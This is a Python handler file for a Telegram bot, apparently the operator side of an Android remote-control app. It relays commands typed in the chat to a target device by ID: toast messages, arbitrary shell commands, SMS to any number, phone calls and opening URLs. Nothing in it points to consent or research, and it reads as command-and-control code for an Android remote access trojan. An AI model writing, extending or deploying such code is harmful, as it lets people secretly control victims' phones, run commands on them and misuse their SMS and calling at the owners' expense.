# bot_handlers/steps/apk_steps.py
from config import bot
from imports_manager import push_apk_command
from logging_config import get_logger

logger = get_logger("bot_handlers.steps.apk")


def apk_toast_step(message, device_id):
    if not message.text:
        return
    push_apk_command(device_id, "toast", text=message.text)
    bot.send_message(message.chat.id, "✅ تم إرسال Toast")


def apk_shell_step(message, device_id):
    if not message.text:
        return
    push_apk_command(device_id, "shell", command=message.text)
    bot.send_message(message.chat.id, "✅ تم إرسال الأمر")


def apk_sendsms_step(message, device_id):
    if not message.text:
        return
    parts = message.text.split("|")
    if len(parts) != 2:
        bot.send_message(message.chat.id, "❌ استخدم: <code>رقم|نص</code>", parse_mode="HTML")
        return
    push_apk_command(device_id, "send_sms",
                     to=parts[0].strip(), msg=parts[1].strip())
    bot.send_message(message.chat.id, "✅ تم إرسال SMS")


def apk_call_step(message, device_id):
    if not message.text:
        return
    push_apk_command(device_id, "call", to=message.text.strip())
    bot.send_message(message.chat.id, "✅ تم بدء المكالمة")


def apk_url_step(message, device_id):
    if not message.text:
        return
    push_apk_command(device_id, "open_url", url=message.text.strip())
    bot.send_message(message.chat.id, "✅ تم فتح الرابط")
